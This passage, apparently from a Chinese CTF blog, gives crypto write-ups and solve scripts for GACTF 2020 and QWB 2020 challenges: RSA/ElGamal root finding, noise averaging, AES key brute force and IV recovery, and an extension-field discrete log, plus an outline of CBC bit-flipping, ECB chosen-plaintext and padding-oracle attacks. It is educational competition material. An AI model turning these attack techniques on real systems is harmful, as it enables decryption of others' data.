<span class="number">1</span>, mod), pow(rho, s, mod), <span class="number">1</span></span><br><span class="line">        j, k = <span class="number">0</span>, phi // (r * s)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, t):</span><br><span class="line">            k //= r</span><br><span class="line">            d = pow(b, k, mod)</span><br><span class="line">            <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j = phi - discrete_log(d, a)</span><br><span class="line">            b, h, c = b * pow(c, r * j, mod) % mod, h * pow(c, j, mod), pow(c, r, mod)</span><br><span class="line">        <span class="keyword">return</span> pow(delta, alpha, mod) * h % mod</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allroot</span><span class="params">(root, r, q, k = <span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="comment"># find all roots satisfy a**r \equiv delta % q**k</span></span><br><span class="line">    </span><br><span class="line">    phi = (q - <span class="number">1</span>) * q**(k - <span class="number">1</span>)</span><br><span class="line">    mod = q ** k</span><br><span class="line">    all_root = set()</span><br><span class="line">    all_root.add(root)</span><br><span class="line">    <span class="keyword">while</span> len(all_root) &lt; r:</span><br><span class="line">        new_root = root</span><br><span class="line">        unity = pow(getRandomRange(<span class="number">2</span>, mod), phi // r, mod)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            new_root = (new_root * unity) % mod</span><br><span class="line">            all_root.add(new_root)</span><br><span class="line">    <span class="keyword">return</span> all_root</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> list(allroot(AMM(c, <span class="number">2</span>, m0, <span class="number">15</span>), <span class="number">2</span>, m0, <span class="number">15</span>)):</span><br><span class="line">    print(long_to_bytes(flag))</span><br><span class="line"><span class="comment"># b'you_4re_good_at_b0th_el94mal_and_rs4'</span></span><br></pre></td></tr></table></figure><h3 id="what-r-the-noise"><a href="#what-r-the-noise" class="headerlink" title="what_r_the_noise"></a>what_r_the_noise</h3><h4 id="题解分析-2"><a href="#题解分析-2" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>可无限次获取flag带偏差的ascii值，取平均就行- -就这就这</p><p>看出的flag的意思，应该和差分隐私有关，彳亍</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"124.71.145.165"</span>, <span class="string">"9999"</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">flag = [eval(_) <span class="keyword">for</span> _ <span class="keyword">in</span> io.recvline().strip().decode()[:<span class="number">-1</span>].split(<span class="string">","</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_noise</span><span class="params">(flag, i)</span>:</span></span><br><span class="line">    flag_with_noise = [<span class="number">0</span>] * len(flag)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**i):</span><br><span class="line">        io.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">        new_flag_with_noise = [eval(_) <span class="keyword">for</span> _ <span class="keyword">in</span> io.recvline().strip().decode()[:<span class="number">-1</span>].split(<span class="string">","</span>)]</span><br><span class="line">        flag_with_noise = [flag_with_noise[i] + new_flag_with_noise[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag))]</span><br><span class="line">    flag_with_noise = [_ / (<span class="number">2</span>**i) <span class="keyword">for</span> _ <span class="keyword">in</span> flag_with_noise]</span><br><span class="line">    flag = [(flag[i] + flag_with_noise[i]) / <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag))]</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">10</span>)):</span><br><span class="line">    flag = remove_noise(flag, i)</span><br><span class="line">    print(bytes([round(_) <span class="keyword">for</span> _ <span class="keyword">in</span> flag]))</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[+] Opening connection to 124.71.145.165 on port 9999: Done</span></span><br><span class="line"><span class="string">  0%|                                                                                                                                                                                | 0/10 [00:00&lt;?, ?it/s]b'k^gufxyrt\\gnlvfrwcf_]anvo_ejodftensicq^ptjvfcy\x80'</span></span><br><span class="line"><span class="string"> 10%|████████████████▊                                                                                                                                                       | 1/10 [00:00&lt;00:01,  7.45it/s]b'j_euf&#123;ypx_hnmvanvch__`n&#125;pabliffqfnshao_orjueaz~'</span></span><br><span class="line"><span class="string"> 20%|█████████████████████████████████▌                                                                                                                                      | 2/10 [00:00&lt;00:01,  5.56it/s]b'hbdug|xpv`jnnwanvcf`banyr`dkgfdqfoshan`qqjvb`&#123;|'</span></span><br><span class="line"><span class="string"> 30%|██████████████████████████████████████████████████▍                                                                                                                     | 3/10 [00:00&lt;00:02,  3.47it/s]b'hacug|xou`kmow_lubh`bbows`dkegdrfntian_qqivabx&#125;'</span></span><br><span class="line"><span class="string"> 40%|███████████████████████████████████████████████████████████████████▏                                                                                                    | 4/10 [00:02&lt;00:03,  1.84it/s]b'g`cuf&#123;xot`kmow_mvcg`aaovt_dkfffrentiam_privaby&#125;'</span></span><br><span class="line"><span class="string"> 50%|████████████████████████████████████████████████████████████████████████████████████                                                                                    | 5/10 [00:04&lt;00:05,  1.02s/it]b'g`ctf&#123;xou_jnow_mvcg_about_djfffrentiam_priv`cy&#125;'</span></span><br><span class="line"><span class="string"> 60%|████████████████████████████████████████████████████████████████████████████████████████████████████▊                                                                   | 6/10 [00:08&lt;00:08,  2.04s/it]b'gactf&#123;you_jnow_much_abous_difffrential_privacy&#125;'</span></span><br><span class="line"><span class="string"> 70%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▌                                                  | 7/10 [00:17&lt;00:12,  4.13s/it]b'gactf&#123;you_jnow_much_about_differential_privacy&#125;'</span></span><br><span class="line"><span class="string"> 80%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▍                                 | 8/10 [00:35&lt;00:16,  8.27s/it]b'gactf&#123;you_know_much_about_differential_privacy&#125;'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="EzAES"><a href="#EzAES" class="headerlink" title="EzAES"></a>EzAES</h3><h4 id="题解分析-3"><a href="#题解分析-3" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b'T0EyZaLRzQmNe2**'</span> <span class="comment"># $O(2^&#123;16&#125;)$</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message,passphrase,iv)</span>:</span></span><br><span class="line">aes = AES.new(passphrase, AES.MODE_CBC, iv)</span><br><span class="line"><span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line">h = hashlib.md5(key).hexdigest()</span><br><span class="line">SECRET = binascii.unhexlify(h)[:<span class="number">10</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">IV = f.read().strip(<span class="string">b'gactf&#123;'</span>).strip(<span class="string">b'&#125;'</span>)</span><br><span class="line">message = <span class="string">b'AES CBC Mode is commonly used in data encryption. What do you know about it?'</span>+SECRET</span><br><span class="line">print(<span class="string">"Encrypted data: "</span>, binascii.hexlify(encrypt(pad(message),key,IV)))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Encrypted data: b'a8**************************b1a923**************************011147**************************6e094e**************************cdb1c7**********a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>分段print下cipher发现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'a8**************************b1a9'</span></span><br><span class="line"><span class="string">b'23**************************0111'</span></span><br><span class="line"><span class="string">b'47**************************6e09'</span></span><br><span class="line"><span class="string">b'4e**************************cdb1'</span></span><br><span class="line"><span class="string">b'c7**********a32c412a3e7474e584cd'</span></span><br><span class="line"><span class="string">b'72481dab9dd83141706925d92bdd39e4'</span></span><br></pre></td></tr></table></figure><p>于是只要在$O(2^{16})$下爆破key，取最后一块作ECB解密，再与已知的倒二块后10bytes异或，当异或结果为message末位padding(<code>b&#39;\x10&#39;*10</code>)，即找到正确key</p><p>接下来从后往前逐块进行ECB解密（message已全部得到），即可推出iv</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii, sys, hashlib</span><br><span class="line"></span><br><span class="line">key = list(<span class="string">b'T0EyZaLRzQmNe2**'</span>)</span><br><span class="line"></span><br><span class="line">KEYSIZE = <span class="number">16</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(message)</span>:</span></span><br><span class="line">    p = bytes((KEYSIZE - len(message) % KEYSIZE) * chr(KEYSIZE - len(message) % KEYSIZE),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> message + p</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">b'a8**************************b1a923**************************011147**************************6e094e**************************cdb1c7**********a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        k = bytes(key[:<span class="number">-2</span>] + [i, j])</span><br><span class="line">        h = hashlib.md5(k).hexdigest()</span><br><span class="line">        SECRET = binascii.unhexlify(h)[:<span class="number">10</span>]</span><br><span class="line">        aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">if</span> xor(aes.decrypt(binascii.unhexlify(cipher[<span class="number">-32</span>:]))[<span class="number">-10</span>:], binascii.unhexlify(cipher[<span class="number">-52</span>:<span class="number">-32</span>])) == bytes([<span class="number">10</span>] * <span class="number">10</span>):</span><br><span class="line">            print(k)</span><br><span class="line">            print(SECRET)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'T0EyZaLRzQmNe2pd'</span></span><br><span class="line"><span class="string">b'\xfc\x89\xb4\xd5\xe2\x0b\xd2\xc6U\xae'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">b'T0EyZaLRzQmNe2pd'</span></span><br><span class="line">SECRET = <span class="string">b'\xfc\x89\xb4\xd5\xe2\x0b\xd2\xc6U\xae'</span></span><br><span class="line">message = pad(<span class="string">b'AES CBC Mode is commonly used in data encryption. What do you know about it?'</span>+SECRET)</span><br><span class="line">ct = binascii.unhexlify(cipher[<span class="number">-32</span>:])</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    ct = xor(aes.decrypt(ct), message[<span class="number">-16</span>:])</span><br><span class="line">    message = message[:<span class="number">-16</span>]</span><br><span class="line">iv = xor(aes.decrypt(ct), message[<span class="number">-16</span>:])</span><br><span class="line">iv</span><br><span class="line"><span class="comment"># b'9j_for_aes_cbc!!'</span></span><br></pre></td></tr></table></figure><h3 id="square"><a href="#square" class="headerlink" title="square"></a>square</h3><h4 id="题解分析-4"><a href="#题解分析-4" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'Please give me 100 (x,y) which satisfies x**2 = ( 1**2 + 2**2 + ... + y**2) / y\n'</span></span><br></pre></td></tr></table></figure><p>找满足$6x^{2}=(y+1)(2y+1)$的100组(x, y)</p><p>直接暴力跑出前三组$(x, y)$，然后上oeis找到递推式</p><p><a href="https://oeis.org/search?q=1%2C337%2C65521&amp;sort=&amp;language=&amp;go=Search" target="_blank" rel="noopener">https://oeis.org/search?q=1%2C337%2C65521&amp;sort=&amp;language=&amp;go=Search</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FORMULA</span><br><span class="line">a(n) &#x3D; ((7&#x2F;2 + 2*sqrt(3))*(97 + 56*sqrt(3))^n + (7&#x2F;2 - 2*sqrt(3))*(97 - 56*sqrt(3))^n - 3)&#x2F;4.</span><br><span class="line"></span><br><span class="line">a(n) &#x3D; (floor((7&#x2F;2 + 2*sqrt(3))*(97 + 56*sqrt(3))^n) - 2)&#x2F;4.</span><br><span class="line"></span><br><span class="line">a(n+3) &#x3D; 195*(a(n+2) - a(n+1)) + a(n).</span><br></pre></td></tr></table></figure><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"124.71.158.89"</span>, <span class="string">"8888"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = re.findall(<span class="string">r"md5\(str \+ (.*)\)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    cipher = re.findall(<span class="string">r"== (.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((x + suffix).encode(<span class="string">"latin-1"</span>)).hexdigest()[:<span class="number">5</span>] ==</span><br><span class="line">                        cipher, string.ascii_lowercase + string.digits, length=<span class="number">5</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me xxxxx: "</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># a(n+3) = 195*(a(n+2) - a(n+1)) + a(n)</span></span><br><span class="line">    data = [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">195</span>, <span class="number">337</span>), (<span class="number">37829</span>, <span class="number">65521</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>):</span><br><span class="line">        y = <span class="number">195</span> * (data[<span class="number">-1</span>][<span class="number">1</span>] - data[<span class="number">-2</span>][<span class="number">1</span>]) + data[<span class="number">-3</span>][<span class="number">1</span>]</span><br><span class="line">        x = int(iroot(((y + <span class="number">1</span>) * (<span class="number">2</span> * y + <span class="number">1</span>)) // <span class="number">6</span>, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">        data.append((x, y))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        io.sendlineafter(<span class="string">"[&gt;] x: "</span>, str(data[i][<span class="number">0</span>]))</span><br><span class="line">        io.sendlineafter(<span class="string">"[&gt;] y: "</span>, str(data[i][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">send_data()</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">You are right!</span></span><br><span class="line"><span class="string">flag is: gactf&#123;congrts_you_solve_it&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h3><h4 id="题解分析-5"><a href="#题解分析-5" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>完全出原题可还行，甚至p都一样</p><p><a href="https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html" target="_blank" rel="noopener">https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html</a></p><p>基点g，啥提示没有，原题也是屑题，盲猜$x_{g}^{2}+y_{g}^{2}=1(mod\ p)$，由add function可知：</p><script type="math/tex; mode=display">(x,y) => x^2+y^2\\(x^2-y^2,2xy) => x^4-2x^2y^2+y^4+4x^2y^2=x^4+2x^2y^2+y^4=(x^2+y^2)^2</script><p>也就是说在g为基点时，mutiply得到的整个域上均满足$x^{2}+y^{2}\equiv 1(mod\ p)$</p><p>给出两个点A,B，利用$gcd(x_{A}^{2}+y_{A}^{2}-1,x_{B}^{2}+y_{B}^{2}-1)$得到p</p><p>得到p后，想要得到<code>shared = multiply(A, b)[0]</code></p><p>由于前述点集的通项和add function，可将其表示为单位⚪上的点</p><p>sage对某个域存在<code>extend</code>函数，参数可传入一个polynomial，作用大概就是将这个域引入该polynomial对应的所有根（包括虚根），再重新形成环的定义后返回一个<strong>扩展域</strong>（和先前的商环quotient不同）</p><p>因此用该扩展域表示单位圆上的点，求解DLP即可得到b，进而获得share</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">A = (<span class="number">68279847973010227567437241690876400434176575735647388141445319082120661</span>, <span class="number">36521392659318312718307506287199839545959127964141955928297920414981390</span>)</span><br><span class="line">B = (<span class="number">84698630137710906531637499064120297563999383201108850561060383338482806</span>, <span class="number">10975400339031190591877824767290004140780471215800442883565278903964109</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = GCD(A[<span class="number">0</span>]^<span class="number">2</span>+A[<span class="number">1</span>]^<span class="number">2</span><span class="number">-1</span>, B[<span class="number">0</span>]^<span class="number">2</span>+B[<span class="number">1</span>]^<span class="number">2</span><span class="number">-1</span>)</span><br><span class="line">factor(p)</span><br><span class="line"><span class="comment"># 2^2 * 108848362000185157098908557633810357240367513945191048364780883709439999</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">108848362000185157098908557633810357240367513945191048364780883709439999</span></span><br><span class="line">g = (<span class="number">29223879291878505213325643878338189297997503744039619988987863719655098</span>, <span class="number">32188620669315455017576071518169599806490004123869726364682284676721556</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_points</span><span class="params">(P, Q)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ((P[<span class="number">0</span>]*Q[<span class="number">0</span>]-P[<span class="number">1</span>]*Q[<span class="number">1</span>]) % p, (P[<span class="number">0</span>]*Q[<span class="number">1</span>]+P[<span class="number">1</span>]*Q[<span class="number">0</span>]) % p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(P, n)</span>:</span></span><br><span class="line">    Q = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            Q = add_points(Q, P)</span><br><span class="line">        P = add_points(P, P)</span><br><span class="line">        n = n//<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">F = GF(p)</span><br><span class="line">R.&lt;w&gt; = PolynomialRing(F)</span><br><span class="line">K.&lt;w&gt; = F.extension(w^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">g_K = g[<span class="number">0</span>] + g[<span class="number">1</span>]*w</span><br><span class="line">B_K = B[<span class="number">0</span>] + B[<span class="number">1</span>]*w</span><br><span class="line">b = discrete_log(B_K, g_K)</span><br><span class="line">print(b)</span><br><span class="line">print(multiply(g, b) == B)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">42167952593276919058888649873311585235839247920808784925745017581061391</span></span><br><span class="line"><span class="string">True</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">shared = multiply(A, b)[<span class="number">0</span>]</span><br><span class="line">key = sha256(long_to_bytes(shared)).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plaintext = aes.decrypt(bytes.fromhex(<span class="string">"26b1b05962d188f1f2abdfad2cef049d45cfc27d9e46f40ebe52e367941bcfa05dd0ef698f528375be2185759e663431"</span>))</span><br><span class="line">print(plaintext)</span><br><span class="line"><span class="comment"># b'gactf&#123;354b6ce4c03387a828a3c30061213204&#125;\t\t\t\t\t\t\t\t\t'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(强网杯2020) - Crypto</title>
      <link href="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/"/>
      <url>/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="modestudy"><a href="#modestudy" class="headerlink" title="modestudy"></a>modestudy</h3><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>qwb经典study系列（套娃</p><ul><li><p>Challenge-1: AES/CBC字节翻转</p></li><li><p>Challenge-2: AES/CBC Encrypt Oracle（iv fixed），发送<code>b&#39;\x00&#39;*32</code>，即可还原iv</p></li><li><p>Challenge-3: ECB，将第三组cipher换为第五组cipher即可</p><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/image-20200824134157397.png" alt></p></li><li><p>Challenge-4: ECB选择明文攻击 ($E_{k}(pt||salt)$)，至多256*len(salt)次即可恢复salt</p><p>(由于访问频率限制问题，在爆破单个salt比特位时，宜将256组拼接，在一次中请求加密)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mt = <span class="string">b""</span></span><br><span class="line"><span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    mt += (prefix + secret + bytes([lsb]))</span><br><span class="line">    ct = chal4_enc(mt)[:<span class="number">16</span>*<span class="number">0xff</span>]</span><br></pre></td></tr></table></figure></li><li><p>Challenge-5: 通过报错发现<code>assert(len(pt) % 2 == 0)</code>，因此<code>myblockencrypt_ecb</code>是个分组长度仅为2bytes的ECB，爆破即可（同样由于频率限制，宜拼接一次性发送，打表本地查找）</p></li><li><p>Challenge-6: Padding Oracle Attack（crack_range为第一块，且IV可控）</p></li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 